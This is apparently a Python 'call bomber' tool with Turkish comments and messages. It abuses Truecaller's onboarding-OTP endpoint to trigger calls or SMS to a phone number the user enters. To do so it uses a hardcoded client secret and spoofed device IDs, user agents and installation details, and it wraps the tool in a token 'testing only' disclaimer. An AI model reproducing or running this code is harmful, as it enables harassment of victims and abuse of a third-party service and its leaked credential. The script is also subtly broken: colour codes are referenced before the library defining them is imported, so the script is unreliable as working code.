# Gerekli kütüphane: pip install requests
import requests
import random
import hashlib
import time
import json # JSON yanıtını işlemek için
import re   # Telefon numarasını ayrıştırmak için
import sys

print("--- 401Team Call Bomber ---")
print(f"{Fore.YELLOW}UYARI: Bu aracı yalnızca test amacıyla")
print(f"{Fore.YELLOW}Yasa dışı kullanımdaki tüm sorumluluk kullanıcıya aittir.")
print(f"{Fore.YELLOW}Callbomb API'si zamanla değişebilir veya çalışmayabilir.\n")


# Telefon numarasını ayrıştırma fonksiyonu
def parse_phone_number(phone_input):
    """
    Verilen telefon numarası girdisinden ülke kodu, çevirme kodu ve
    asıl numarayı ayrıştırır. Örnek: +905551234567
    """
    match = re.match(r'\+(\d{1,3})(\d{10,})$', phone_input) # + ile başlayan, 1-3 haneli ülke kodu, 10+ haneli numara
    if match:
        dialing_code = match.group(1)
        number = match.group(2)
        # Basit bir ülke kodu -> ISO ülke kodu eşleştirmesi (genişletilebilir)
        country_codes = {
            "90": "TR", # Türkiye
            "1": "US",  # ABD/Kanada
            "44": "GB", # İngiltere
            "49": "DE", # Almanya
            "20": "EG", # Mısır (orijinal kodda vardı)
            # Diğer ülkeleri buraya ekleyebilirsiniz
        }
        country_iso = country_codes.get(dialing_code, "N/A") # Eşleşme yoksa N/A
        if country_iso != "N/A":
            return country_iso, dialing_code, number
        else:
            print(f"{Fore.RED}HATA: {dialing_code} için ISO ülke kodu bulunamadı.")
            return None, None, None
    else:
        print(f"{Fore.RED}HATA: Geçersiz telefon numarası formatı. Örnek: +905551234567")
        return None, None, None

def send_call(phone_number_full):
    """Belirtilen numaraya Truecaller API'si üzerinden arama isteği gönderir."""

    country_code, dialing_code, number_only = parse_phone_number(phone_number_full)

    if not country_code:
        return # Ayrıştırma başarısız olduysa fonksiyondan çık

    # Rastgele cihaz ID oluştur
    asa = '123456789'
    gigk = ''.join(random.choice(asa) for i in range(10))
    device_id = hashlib.md5(gigk.encode()).hexdigest()[:16]

    # API URL ve Headerlar
    url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'
    client_secret = 'lvc22mp3l1sfv6ujg83rd17btt'  # Bu hala çalışmayabilir
    user_agent = f'Truecaller/13.{random.randint(10, 50)}.8 (Android;{random.choice(["9","10","11","12"])}.0)' # Biraz daha dinamik user-agent

    headers = {
        'clientsecret': client_secret,
        'user-agent': user_agent,
        'accept-encoding': 'gzip',
        # 'content-length' ve 'Host' requests tarafından otomatik eklenir
        'content-type': 'application/json; charset=UTF-8',
    }

    # JSON Payload (dinamik ülke kodları ile)
    # Diğer bazı alanlar hala sabit, API bunları ne kadar kontrol ediyor bilinmez
    payload = {
        "countryCode": country_code,
        "dialingCode": int(dialing_code), # API integer bekleyebilir
        "installationDetails": {
            "app": {"buildVersion": 8, "majorVersion": 13, "minorVersion": random.randint(10, 50), "store": "GOOGLE_PLAY"},
            "device": {"deviceId": device_id, "language": "en", "manufacturer": "Xiaomi", "mobileServices": ["GMS"], "model": "Redmi Note 10", "osName": "Android", "osVersion": "11.0", "simSerials": []}, # Sim bilgileri boş bırakılabilir
            "language": "en",
            "sims": [], # Sim bilgileri boş bırakılabilir
            "storeVersion": {"buildVersion": 8, "majorVersion": 13, "minorVersion": random.randint(10, 50)}
        },
        "phoneNumber": number_only, # Sadece numara kısmı
        "region": "region-1", # Bölge değişebilir, test edilebilir
        "sequenceNo": random.randint(1, 5) # Sequence no rastgele olabilir
    }

    try:
        print(f"{Fore.CYAN}İstek gönderiliyor: {phone_number_full} (Ülke: {country_code}, Numara: {number_only})")
        response = requests.post(url, headers=headers, json=payload, timeout=15) # Timeout artırıldı

        print(f"{Fore.CYAN}Yanıt Kodu: {response.status_code}")
        try:
            response_json = response.json()
            print(f"{Fore.CYAN}Yanıt JSON: {json.dumps(response_json, indent=2)}") # Yanıtı formatlı yazdır

            # Truecaller'ın başarılı yanıtı genellikle "status": 1 veya 6 içerir
            # Bu API özelinde yanıt formatı değişmiş olabilir, kontrol etmek gerekir
            if response.status_code == 200:
                status = response_json.get("status")
                message = response_json.get("message", "Mesaj yok")
                if status in [1, 6, 8] or "success" in message.lower(): # Olası başarı durumları
                     print(f"{Fore.GREEN}İSTEK BAŞARILI GÖRÜNÜYOR! (Status: {status})")
                     print(f"{Fore.GREEN}Arama yakında gelmeli (veya SMS). Yanıt Mesajı: {message}")
                elif status == 18:
                     print(f"{Fore.RED}HATA: Geçersiz Telefon Numarası! (Status: {status}) - Mesaj: {message}")
                elif status == 9:
                     print(f"{Fore.RED}HATA: Çok Fazla İstek! (Status: {status}) - Daha sonra tekrar deneyin. Mesaj: {message}")
                else:
                     print(f"{Fore.YELLOW}UYARI: İstek gönderildi ancak başarı durumu net değil (Status: {status}). Mesaj: {message}")
            else:
                print(f"{Fore.RED}HATA: İstek başarısız oldu. Sunucu yanıtı yukarıda.")

        except json.JSONDecodeError:
            print(f"{Fore.RED}HATA: Sunucu yanıtı JSON formatında değil.")
            print(f"{Fore.CYAN}Yanıt Metni: {response.text[:200]}") # Yanıtın ilk 200 karakteri
        except Exception as e:
            print(f"{Fore.RED}HATA: Yanıt işlenirken hata oluştu: {e}")

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}HATA: İstek zaman aşımına uğradı.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}HATA: İstek gönderilirken bir ağ hatası oluştu: {e}")
    except Exception as e:
        print(f"{Fore.RED}Beklenmedik bir hata oluştu: {e}")

# Ana çalıştırma bloğu
if __name__ == "__main__":
    # Colorama'yı başlat (eğer sms_bomb gibi başka bir yerden başlatılmıyorsa)
    try:
        from colorama import init, Fore, Style
        init(autoreset=True)
    except ImportError:
        print("Uyarı: Renkli çıktılar için 'colorama' kütüphanesi gerekli. (pip install colorama)")
        # Colorama yoksa Fore vs. yerine boş stringler tanımla
        class Fore:
            YELLOW = ""
            RED = ""
            CYAN = ""
            GREEN = ""
            BLUE = ""
            MAGENTA = ""
        class Style:
            RESET_ALL = ""

    while True:
        try:
            phone_input = input(f"{Fore.YELLOW}Hedef telefon numarasını girin (Örn: +905551234567) veya çıkmak için 'q': {Style.RESET_ALL}").strip()
            if phone_input.lower() == 'q':
                break
            if phone_input:
                send_call(phone_input)
            else:
                print(f"{Fore.RED}Lütfen bir numara girin.")
            print("-" * 30) # İstekler arasına ayırıcı koy
        except KeyboardInterrupt:
            print("\nÇıkılıyor...")
            break

    print(f"{Fore.BLUE}Program sonlandırıldı.")